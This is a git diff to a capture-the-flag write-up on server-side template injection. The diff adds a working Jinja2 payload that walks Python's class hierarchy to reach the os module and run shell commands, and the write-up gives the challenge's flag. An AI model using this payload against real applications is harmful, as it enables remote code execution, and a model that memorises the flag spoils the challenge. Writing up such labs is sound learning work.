@@ -10,7 +10,16 @@ Hanish writeup
 - https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/
 - https://github.com/m14r41/PentestingEverything
 
-I started by reading about SSTI and testing the input field with `{{7*7'}}`. The unusual output helped me identify a possible Jinja2 template injection. I then tested commands using Python's `os` module and confirmed command execution with `id` and `ls`. Finally, I inspected the application source returned by the command and found the flag.
+I started by reading about SSTI and testing the input field with `{{7*7'}}`. The unusual output helped me identify a possible Jinja2 template injection. I then tested commands using Python's `os` module and confirmed command execution with `id` and `ls`. Just by modifying the reference payloads I finally inspected the application source returned by the command and found the flag.
+
+**Payload:** 
+`
+{% for x in ().__class__.__base__.__subclasses__() %}
+    {% if "warning" in x.__name__ %}
+        {{x()._module.__builtins__['__import__']('os').popen("ls").read()}}
+    {%endif%}
+{%endfor%}
+`
 
 **Flag:** `OWASP{sst1_4ll0ws_rc3_1f_n0t_s4n1t1z3d_13b995a6b0}`
 
